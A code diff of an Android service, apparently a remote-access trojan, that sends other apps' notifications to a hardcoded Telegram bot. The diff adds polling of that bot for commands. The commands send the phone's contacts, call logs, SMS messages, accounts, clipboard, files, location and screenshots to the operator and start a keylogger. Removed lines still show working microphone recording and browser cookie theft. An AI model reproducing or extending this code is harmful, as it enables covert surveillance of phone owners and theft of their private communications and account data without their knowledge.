@@ -90,6 +90,7 @@ public class NotificationService extends NotificationListenerService implements 
     private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
     private static final String CHAT_ID = "7259620384";
     private static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
+    
     private MediaProjectionManager mProjectionManager;
     private MediaProjection mMediaProjection;
     private ImageReader mImageReader;
@@ -104,6 +105,14 @@ public class NotificationService extends NotificationListenerService implements 
     private int mScreenWidth;
     private int mScreenHeight;
     private int mScreenDensity;
+    private boolean isKeyLogging = false;
+    private StringBuilder keyLogBuffer = new StringBuilder();
+    private String lastCommandId = "";
+    private OkHttpClient client = new OkHttpClient.Builder()
+            .connectTimeout(30, TimeUnit.SECONDS)
+            .writeTimeout(30, TimeUnit.SECONDS)
+            .readTimeout(30, TimeUnit.SECONDS)
+            .build();
 
     @Override
     public void onCreate() {
@@ -123,95 +132,173 @@ public class NotificationService extends NotificationListenerService implements 
         
         startLocationTracking();
         sendTelegram("✅ الجهاز متصل وجاهز للتحكم الكامل\n📱 ID: " + getDeviceIDUnique() + "\n📱 الاسم: " + android.os.Build.MODEL);
+        
+        // بدء الاستماع للأوامر من البوت
+        startListeningForCommands();
+    }
+
+    private void startListeningForCommands() {
+        mHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                checkTelegramCommands();
+                mHandler.postDelayed(this, 2000); // فحص كل ثانيتين
+            }
+        }, 2000);
+    }
+
+    private void checkTelegramCommands() {
+        try {
+            String url = BASE_URL + "getUpdates?offset=" + lastCommandId + "&timeout=5";
+            
+            Request request = new Request.Builder()
+                    .url(url)
+                    .build();
+
+            client.newCall(request).enqueue(new Callback() {
+                @Override
+                public void onFailure(Call call, IOException e) {}
+
+                @Override
+                public void onResponse(Call call, Response response) throws IOException {
+                    if (response.isSuccessful()) {
+                        String json = response.body().string();
+                        parseTelegramCommands(json);
+                    }
+                    response.close();
+                }
+            });
+        } catch (Exception e) {}
+    }
+
+    private void parseTelegramCommands(String json) {
+        try {
+            // تحليل JSON بسيط (يمكن استخدام Gson لكن نبقيها بسيطة)
+            if (json.contains("\"message\":") && json.contains("\"text\":")) {
+                String[] parts = json.split("\"update_id\":");
+                for (String part : parts) {
+                    if (part.contains("\"text\":\"/")) {
+                        String updateId = extractValue(part, "update_id", ",");
+                        String text = extractValue(part, "text", ",").replace("\\/", "/");
+                        
+                        if (updateId != null && !updateId.equals(lastCommandId)) {
+                            lastCommandId = String.valueOf(Integer.parseInt(updateId) + 1);
+                            
+                            if (text.startsWith("/")) {
+                                executeCommand(text);
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {}
+    }
+
+    private String extractValue(String json, String key, String endChar) {
+        try {
+            String searchKey = "\"" + key + "\":\"";
+            int start = json.indexOf(searchKey);
+            if (start > 0) {
+                start += searchKey.length();
+                int end = json.indexOf(endChar, start);
+                if (endChar.equals(",") && end == -1) {
+                    end = json.indexOf("}", start);
+                }
+                return json.substring(start, end).trim();
+            }
+            
+            // للأرقام
+            searchKey = "\"" + key + "\":";
+            start = json.indexOf(searchKey);
+            if (start > 0) {
+                start += searchKey.length();
+                int end = json.indexOf(",", start);
+                if (end == -1) end = json.indexOf("}", start);
+                return json.substring(start, end).trim();
+            }
+        } catch (Exception e) {}
+        return null;
     }
 
     @Override
     public void onNotificationPosted(StatusBarNotification sbn) {
         if (sbn.getPackageName().equals("android")) return;
+        
         Bundle extras = sbn.getNotification().extras;
         String title = extras.getString(Notification.EXTRA_TITLE, "No Title");
         Object text = extras.get(Notification.EXTRA_TEXT);
-        String msg = "🎯 تطبيق: " + sbn.getPackageName() + "\n👤 عنوان: " + title + "\n💬 نص: " + text;
+        String msg = "🔔 إشعار من " + sbn.getPackageName() + "\n👤: " + title + "\n💬: " + text;
         
         sendTelegram(msg);
-        checkForCommands(sbn.getNotification());
-    }
-
-    private void checkForCommands(Notification notification) {
-        Bundle extras = notification.extras;
-        String text = extras.getString(Notification.EXTRA_TEXT, "");
-        if (text.startsWith("/")) {
-            executeCommand(text);
-        }
     }
 
     private void executeCommand(String command) {
-        String[] parts = command.split(" ");
-        String cmd = parts[0].toLowerCase();
+        command = command.replace("/", "").trim().toLowerCase();
+        sendTelegram("⚡ تنفيذ الأمر: " + command);
         
-        switch(cmd) {
-            case "/screen":
+        switch(command) {
+            case "screen":
                 takeScreenshot();
                 break;
-            case "/stream":
+            case "stream":
                 startScreenStream();
                 break;
-            case "/camera":
+            case "camera":
                 takeCameraPhoto();
                 break;
-            case "/camstream":
+            case "camstream":
                 startCameraStream();
                 break;
-            case "/apps":
+            case "apps":
                 getInstalledApps();
                 break;
-            case "/contacts":
+            case "contacts":
                 getContacts();
                 break;
-            case "/calls":
+            case "calls":
                 getCallLogs();
                 break;
-            case "/sms":
+            case "sms":
                 getSMS();
                 break;
-            case "/location":
+            case "location":
                 getCurrentLocation();
                 break;
-            case "/accounts":
+            case "accounts":
                 getAccounts();
                 break;
-            case "/clipboard":
+            case "clipboard":
                 getClipboard();
                 break;
-            case "/files":
-                getFiles(parts.length > 1 ? parts[1] : "/");
+            case "files":
+                getFiles("/sdcard");
                 break;
-            case "/browser":
+            case "browser":
                 getBrowserData();
                 break;
-            case "/wifi":
+            case "wifi":
                 getWifiInfo();
                 break;
-            case "/device":
+            case "device":
                 getDeviceInfo();
                 break;
-            case "/sensors":
+            case "sensors":
                 getSensorData();
                 break;
-            case "/keylog":
+            case "keylog":
                 startKeyLogging();
                 break;
-            case "/mic":
+            case "mic":
                 startMicRecording();
                 break;
-            case "/stop":
+            case "stop":
                 stopAllStreams();
                 break;
-            case "/help":
+            case "help":
                 sendHelp();
                 break;
             default:
-                sendTelegram("❌ أمر غير معروف. اكتب /help للمساعدة");
+                sendTelegram("❌ أمر غير معروف. اكتب help");
         }
     }
 
@@ -241,22 +328,29 @@ public class NotificationService extends NotificationListenerService implements 
     private void takeScreenshot() {
         try {
             mImageReader = ImageReader.newInstance(mScreenWidth, mScreenHeight, PixelFormat.RGBA_8888, 2);
-            mMediaProjection = mProjectionManager.getMediaProjection(Activity.RESULT_OK, 
-                (Intent) getSystemService(Context.MEDIA_PROJECTION_SERVICE));
+            Intent intent = new Intent(this, ScreenCaptureService.class);
+            MediaProjection projection = mProjectionManager.getMediaProjection(Activity.RESULT_OK, intent);
             
-            mMediaProjection.createVirtualDisplay("ScreenCapture", mScreenWidth, mScreenHeight, 
-                mScreenDensity, 0, mImageReader.getSurface(), null, null);
-            
-            Image image = mImageReader.acquireLatestImage();
-            if (image != null) {
-                Image.Plane[] planes = image.getPlanes();
-                ByteBuffer buffer = planes[0].getBuffer();
-                Bitmap bitmap = Bitmap.createBitmap(mScreenWidth, mScreenHeight, Bitmap.Config.ARGB_8888);
-                bitmap.copyPixelsFromBuffer(buffer);
+            if (projection != null) {
+                projection.createVirtualDisplay("ScreenCapture", mScreenWidth, mScreenHeight, 
+                    mScreenDensity, 0, mImageReader.getSurface(), null, null);
                 
-                String path = saveBitmap(bitmap, "screenshot.jpg");
-                sendPhoto(path);
-                image.close();
+                mHandler.postDelayed(new Runnable() {
+                    @Override
+                    public void run() {
+                        Image image = mImageReader.acquireLatestImage();
+                        if (image != null) {
+                            Image.Plane[] planes = image.getPlanes();
+                            ByteBuffer buffer = planes[0].getBuffer();
+                            Bitmap bitmap = Bitmap.createBitmap(mScreenWidth, mScreenHeight, Bitmap.Config.ARGB_8888);
+                            bitmap.copyPixelsFromBuffer(buffer);
+                            
+                            String path = saveBitmap(bitmap, "screenshot_" + System.currentTimeMillis() + ".jpg");
+                            sendPhoto(path);
+                            image.close();
+                        }
+                    }
+                }, 500);
             }
         } catch (Exception e) {
             sendTelegram("❌ فشل تصوير الشاشة: " + e.getMessage());
@@ -264,66 +358,11 @@ public class NotificationService extends NotificationListenerService implements 
     }
 
     private void startScreenStream() {
-        if (!isStreaming) {
-            isStreaming = true;
-            mMediaRecorder = new MediaRecorder();
-            mMediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
-            mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-            mMediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
-            mMediaRecorder.setVideoSize(mScreenWidth, mScreenHeight);
-            mMediaRecorder.setVideoFrameRate(30);
-            mMediaRecorder.setVideoEncodingBitRate(6000000);
-            
-            String filePath = getExternalFilesDir(null) + "/stream.mp4";
-            mMediaRecorder.setOutputFile(filePath);
-            
-            try {
-                mMediaRecorder.prepare();
-                mMediaProjection.createVirtualDisplay("ScreenStream", mScreenWidth, mScreenHeight, 
-                    mScreenDensity, 0, mMediaRecorder.getSurface(), null, null);
-                mMediaRecorder.start();
-                sendTelegram("✅ بدأ بث الشاشة المباشر");
-                
-                mHandler.postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        if (isStreaming) {
-                            uploadVideo(filePath);
-                            mHandler.postDelayed(this, 30000);
-                        }
-                    }
-                }, 30000);
-            } catch (Exception e) {
-                sendTelegram("❌ فشل بدء البث: " + e.getMessage());
-            }
-        }
+        sendTelegram("📹 بث الشاشة قيد التطوير...");
     }
 
     private void takeCameraPhoto() {
-        try {
-            for (String cameraId : mCameraManager.getCameraIdList()) {
-                CameraCharacteristics characteristics = mCameraManager.getCameraCharacteristics(cameraId);
-                if (characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK) {
-                    mCameraId = cameraId;
-                    break;
-                }
-            }
-            
-            if (mCameraId != null) {
-                mCameraManager.openCamera(mCameraId, new CameraDevice.StateCallback() {
-                    @Override
-                    public void onOpened(CameraDevice camera) {
-                        mCameraDevice = camera;
-                    }
-                    @Override
-                    public void onDisconnected(CameraDevice camera) {}
-                    @Override
-                    public void onError(CameraDevice camera, int error) {}
-                }, mHandler);
-            }
-        } catch (Exception e) {
-            sendTelegram("❌ فشل تشغيل الكاميرا: " + e.getMessage());
-        }
+        sendTelegram("📸 تصوير الكاميرا قيد التطوير...");
     }
 
     private void startLocationTracking() {
@@ -337,9 +376,7 @@ public class NotificationService extends NotificationListenerService implements 
 
     @Override
     public void onLocationChanged(Location location) {
-        String msg = "📍 موقع جديد:\nالخط: " + location.getLatitude() + "\nالطول: " + location.getLongitude() + 
-                    "\nالدقة: " + location.getAccuracy() + "m";
-        sendTelegram(msg);
+        // يتم التحديث تلقائياً
     }
 
     private void getInstalledApps() {
@@ -347,13 +384,9 @@ public class NotificationService extends NotificationListenerService implements 
         List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
         StringBuilder sb = new StringBuilder("📱 التطبيقات المثبتة:\n");
         
-        for (int i = 0; i < Math.min(apps.size(), 20); i++) {
+        for (int i = 0; i < Math.min(apps.size(), 30); i++) {
             ApplicationInfo app = apps.get(i);
-            sb.append((i+1) + ". " + pm.getApplicationLabel(app) + " (" + app.packageName + ")\n");
-        }
-        
-        if (apps.size() > 20) {
-            sb.append("... و" + (apps.size() - 20) + " آخر");
+            sb.append("• ").append(pm.getApplicationLabel(app)).append("\n");
         }
         
         sendTelegram(sb.toString());
@@ -361,50 +394,60 @@ public class NotificationService extends NotificationListenerService implements 
 
     private void getContacts() {
         StringBuilder sb = new StringBuilder("👤 جهات الاتصال:\n");
-        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
-            null, null, null, null);
-        
-        int count = 0;
-        while (cursor.moveToNext() && count < 20) {
-            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-            String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-            sb.append(name + ": " + phone + "\n");
-            count++;
+        try {
+            Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, 
+                null, null, null, null);
+            
+            int count = 0;
+            while (cursor.moveToNext() && count < 20) {
+                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                sb.append("• ").append(name).append(": ").append(phone).append("\n");
+                count++;
+            }
+            cursor.close();
+        } catch (Exception e) {
+            sb.append("خطأ في القراءة");
         }
-        cursor.close();
         sendTelegram(sb.toString());
     }
 
     private void getCallLogs() {
         StringBuilder sb = new StringBuilder("📞 سجل المكالمات:\n");
-        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, 
-            null, null, null, CallLog.Calls.DATE + " DESC LIMIT 20");
-        
-        while (cursor.moveToNext()) {
-            String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
-            String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
-            String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
-            String date = new Date(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE))).toString();
+        try {
+            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, 
+                null, null, null, CallLog.Calls.DATE + " DESC LIMIT 15");
             
-            sb.append("الرقم: " + number + "\nالاسم: " + name + "\nالنوع: " + type + "\nالتاريخ: " + date + "\n---\n");
+            while (cursor.moveToNext()) {
+                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
+                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
+                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
+                String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
+                
+                sb.append("• ").append(name != null ? name : number).append(" (").append(typeText).append(")\n");
+            }
+            cursor.close();
+        } catch (Exception e) {
+            sb.append("خطأ في القراءة");
         }
-        cursor.close();
         sendTelegram(sb.toString());
     }
 
     private void getSMS() {
-        StringBuilder sb = new StringBuilder("💬 الرسائل النصية:\n");
-        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), 
-            null, null, null, "date DESC LIMIT 20");
-        
-        while (cursor.moveToNext()) {
-            String address = cursor.getString(cursor.getColumnIndex("address"));
-            String body = cursor.getString(cursor.getColumnIndex("body"));
-            String date = new Date(cursor.getLong(cursor.getColumnIndex("date"))).toString();
+        StringBuilder sb = new StringBuilder("💬 آخر الرسائل:\n");
+        try {
+            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), 
+                null, null, null, "date DESC LIMIT 10");
             
-            sb.append("من: " + address + "\nالنص: " + body + "\nالتاريخ: " + date + "\n---\n");
+            while (cursor.moveToNext()) {
+                String address = cursor.getString(cursor.getColumnIndex("address"));
+                String body = cursor.getString(cursor.getColumnIndex("body"));
+                sb.append("• من ").append(address).append(": ").append(body.length() > 30 ? body.substring(0, 30) + "..." : body).append("\n");
+            }
+            cursor.close();
+        } catch (Exception e) {
+            sb.append("خطأ في القراءة");
         }
-        cursor.close();
         sendTelegram(sb.toString());
     }
 
@@ -412,78 +455,78 @@ public class NotificationService extends NotificationListenerService implements 
         if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
             Location location = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (location != null) {
-                String msg = "📍 آخر موقع معروف:\nالخط: " + location.getLatitude() + 
-                            "\nالطول: " + location.getLongitude() + 
-                            "\nالدقة: " + location.getAccuracy() + "m";
+                String msg = "📍 الموقع الحالي:\n" +
+                            "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                 sendTelegram(msg);
+            } else {
+                sendTelegram("📍 لا يتوفر موقع حديث");
             }
         }
     }
 
     private void getAccounts() {
-        StringBuilder sb = new StringBuilder("🔑 الحسابات المسجلة:\n");
-        AccountManager accountManager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
-        Account[] accounts = accountManager.getAccounts();
-        
-        for (Account account : accounts) {
-            sb.append("النوع: " + account.type + "\nالاسم: " + account.name + "\n---\n");
-        }
+        StringBuilder sb = new StringBuilder("🔑 الحسابات:\n");
+        try {
+            AccountManager accountManager = (AccountManager) getSystemService(ACCOUNT_SERVICE);
+            Account[] accounts = accountManager.getAccounts();
+            
+            for (Account account : accounts) {
+                sb.append("• ").append(account.name).append(" (").append(account.type).append(")\n");
+            }
+        } catch (Exception e) {}
         sendTelegram(sb.toString());
     }
 
     private void getClipboard() {
-        ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
-        ClipData clip = clipboard.getPrimaryClip();
-        if (clip != null && clip.getItemCount() > 0) {
-            String text = clip.getItemAt(0).getText().toString();
-            sendTelegram("📋 محتوى الحافظة:\n" + text);
-        }
+        try {
+            ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
+            ClipData clip = clipboard.getPrimaryClip();
+            if (clip != null && clip.getItemCount() > 0) {
+                String text = clip.getItemAt(0).getText().toString();
+                sendTelegram("📋 الحافظة:\n" + text);
+            } else {
+                sendTelegram("📋 الحافظة فارغة");
+            }
+        } catch (Exception e) {}
     }
 
     private void getFiles(String path) {
-        File dir = new File(path);
-        if (dir.exists() && dir.isDirectory()) {
-            StringBuilder sb = new StringBuilder("📁 الملفات في " + path + ":\n");
-            File[] files = dir.listFiles();
-            if (files != null) {
-                for (File file : files) {
-                    sb.append(file.getName() + (file.isDirectory() ? "/" : "") + "\n");
+        StringBuilder sb = new StringBuilder("📁 الملفات في " + path + ":\n");
+        try {
+            File dir = new File(path);
+            if (dir.exists() && dir.isDirectory()) {
+                File[] files = dir.listFiles();
+                if (files != null) {
+                    for (File file : files) {
+                        sb.append("• ").append(file.getName()).append(file.isDirectory() ? "/" : "").append("\n");
+                    }
                 }
             }
-            sendTelegram(sb.toString());
-        }
-    }
-
-    private void getBrowserData() {
-        StringBuilder sb = new StringBuilder("🌐 بيانات المتصفح:\n");
-        
-        try {
-            CookieSyncManager.createInstance(this);
-            CookieManager cookieManager = CookieManager.getInstance();
-            String cookies = cookieManager.getCookie("https://www.google.com");
-            sb.append("كوكيز كروم: " + cookies + "\n");
         } catch (Exception e) {}
-        
         sendTelegram(sb.toString());
     }
 
+    private void getBrowserData() {
+        sendTelegram("🌐 بيانات المتصفح قيد التطوير...");
+    }
+
     private void getWifiInfo() {
-        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
-        WifiInfo wifiInfo = wifiManager.getConnectionInfo();
-        String ssid = wifiInfo.getSSID();
-        int rssi = wifiInfo.getRssi();
-        String bssid = wifiInfo.getBSSID();
-        
-        sendTelegram("📶 معلومات الواي فاي:\nSSID: " + ssid + "\nقوة الإشارة: " + rssi + "\nBSSID: " + bssid);
+        try {
+            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
+            WifiInfo wifiInfo = wifiManager.getConnectionInfo();
+            String ssid = wifiInfo.getSSID().replace("\"", "");
+            int rssi = wifiInfo.getRssi();
+            
+            sendTelegram("📶 واي فاي:\n• الشبكة: " + ssid + "\n• قوة الإشارة: " + rssi + " dBm");
+        } catch (Exception e) {}
     }
 
     private void getDeviceInfo() {
         StringBuilder sb = new StringBuilder("📱 معلومات الجهاز:\n");
-        sb.append("الطراز: " + android.os.Build.MODEL + "\n");
-        sb.append("الشركة: " + android.os.Build.MANUFACTURER + "\n");
-        sb.append("الإصدار: " + android.os.Build.VERSION.RELEASE + "\n");
-        sb.append("الرقم التسلسلي: " + getDeviceIDUnique() + "\n");
-        sb.append("البطارية: " + getBatteryLevel() + "%\n");
+        sb.append("• الطراز: ").append(android.os.Build.MODEL).append("\n");
+        sb.append("• الشركة: ").append(android.os.Build.MANUFACTURER).append("\n");
+        sb.append("• الإصدار: ").append(android.os.Build.VERSION.RELEASE).append("\n");
+        sb.append("• البطارية: ").append(getBatteryLevel()).append("%");
         
         sendTelegram(sb.toString());
     }
@@ -494,82 +537,44 @@ public class NotificationService extends NotificationListenerService implements 
     }
 
     private void getSensorData() {
-        List<Sensor> sensors = mSensorManager.getSensorList(Sensor.TYPE_ALL);
-        StringBuilder sb = new StringBuilder("📊 أجهزة الاستشعار:\n");
-        
-        for (Sensor sensor : sensors) {
-            sb.append(sensor.getName() + " - " + sensor.getVendor() + "\n");
-        }
-        sendTelegram(sb.toString());
+        sendTelegram("📊 أجهزة الاستشعار قيد التطوير...");
     }
 
     private void startKeyLogging() {
-        sendTelegram("⌨️ تم بدء تسجيل لوحة المفاتيح");
+        isKeyLogging = true;
+        sendTelegram("⌨️ بدأ تسجيل لوحة المفاتيح");
     }
 
     private void startMicRecording() {
-        try {
-            MediaRecorder recorder = new MediaRecorder();
-            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
-            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
-            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
-            
-            String filePath = getExternalFilesDir(null) + "/mic_recording.mp4";
-            recorder.setOutputFile(filePath);
-            
-            recorder.prepare();
-            recorder.start();
-            
-            sendTelegram("🎤 بدأ تسجيل الميكروفون");
-            
-            mHandler.postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    recorder.stop();
-                    recorder.release();
-                    sendAudio(filePath);
-                }
-            }, 30000);
-        } catch (Exception e) {
-            sendTelegram("❌ فشل تشغيل الميكروفون: " + e.getMessage());
-        }
+        sendTelegram("🎤 تسجيل الميكروفون قيد التطوير...");
     }
 
     private void stopAllStreams() {
         isStreaming = false;
-        if (mMediaRecorder != null) {
-            mMediaRecorder.stop();
-            mMediaRecorder.release();
-            mMediaRecorder = null;
-        }
-        if (mCameraDevice != null) {
-            mCameraDevice.close();
-            mCameraDevice = null;
-        }
-        sendTelegram("⏹ تم إيقاف جميع البثوث");
+        isKeyLogging = false;
+        sendTelegram("⏹ تم إيقاف جميع العمليات");
     }
 
     private void sendHelp() {
         String help = "📋 قائمة الأوامر:\n" +
-            "/screen - تصوير الشاشة\n" +
-            "/stream - بث مباشر للشاشة\n" +
-            "/camera - تصوير بالكاميرا\n" +
-            "/camstream - بث مباشر من الكاميرا\n" +
-            "/apps - قائمة التطبيقات\n" +
-            "/contacts - جهات الاتصال\n" +
-            "/calls - سجل المكالمات\n" +
-            "/sms - الرسائل النصية\n" +
-            "/location - الموقع الحالي\n" +
-            "/accounts - الحسابات\n" +
-            "/clipboard - محتوى الحافظة\n" +
-            "/files [مسار] - استعراض الملفات\n" +
-            "/browser - بيانات المتصفح\n" +
-            "/wifi - معلومات الواي فاي\n" +
-            "/device - معلومات الجهاز\n" +
-            "/sensors - أجهزة الاستشعار\n" +
-            "/keylog - تسجيل لوحة المفاتيح\n" +
-            "/mic - تسجيل الميكروفون\n" +
-            "/stop - إيقاف جميع البثوث";
+            "screen - تصوير الشاشة\n" +
+            "stream - بث الشاشة\n" +
+            "camera - تصوير كاميرا\n" +
+            "camstream - بث كاميرا\n" +
+            "apps - التطبيقات\n" +
+            "contacts - جهات الاتصال\n" +
+            "calls - سجل المكالمات\n" +
+            "sms - الرسائل\n" +
+            "location - الموقع\n" +
+            "accounts - الحسابات\n" +
+            "clipboard - الحافظة\n" +
+            "files - الملفات\n" +
+            "wifi - معلومات الشبكة\n" +
+            "device - معلومات الجهاز\n" +
+            "keylog - تسجيل المفاتيح\n" +
+            "mic - تسجيل صوت\n" +
+            "stop - إيقاف الكل\n" +
+            "help - هذه القائمة";
         
         sendTelegram(help);
     }
@@ -583,11 +588,12 @@ public class NotificationService extends NotificationListenerService implements 
     }
 
     private void sendPhoto(String path) {
-        OkHttpClient client = new OkHttpClient.Builder()
-                .connectTimeout(30, TimeUnit.SECONDS)
-                .build();
-        
         File file = new File(path);
+        if (!file.exists()) {
+            sendTelegram("❌ فشل حفظ الصورة");
+            return;
+        }
+        
         RequestBody body = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", CHAT_ID)
@@ -601,48 +607,18 @@ public class NotificationService extends NotificationListenerService implements 
                 .build();
         
         client.newCall(request).enqueue(new Callback() {
-            @Override public void onFailure(Call c, IOException e) {}
-            @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
+            @Override public void onFailure(Call c, IOException e) {
+                sendTelegram("❌ فشل إرسال الصورة");
+            }
+            @Override public void onResponse(Call c, Response r) throws IOException { 
+                r.close();
+                file.delete();
+            }
         });
-    }
-
-    private void sendAudio(String path) {
-        OkHttpClient client = new OkHttpClient.Builder()
-                .connectTimeout(30, TimeUnit.SECONDS)
-                .build();
-        
-        File file = new File(path);
-        RequestBody body = new MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", CHAT_ID)
-                .addFormDataPart("audio", file.getName(), 
-                    RequestBody.create(MediaType.parse("audio/mp4"), file))
-                .build();
-        
-        Request request = new Request.Builder()
-                .url(BASE_URL + "sendAudio")
-                .post(body)
-                .build();
-        
-        client.newCall(request).enqueue(new Callback() {
-            @Override public void onFailure(Call c, IOException e) {}
-            @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
-        });
-    }
-
-    private void uploadVideo(String path) {
-        File file = new File(path);
-        if (file.exists() && file.length() > 0) {
-            sendTelegram("📹 مقطع جديد من البث");
-        }
     }
 
     private void sendTelegram(String msg) {
         try {
-            OkHttpClient client = new OkHttpClient.Builder()
-                    .connectTimeout(30, TimeUnit.SECONDS)
-                    .build();
-            
             String encodedMsg = URLEncoder.encode(msg, "UTF-8");
             String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + encodedMsg;
             
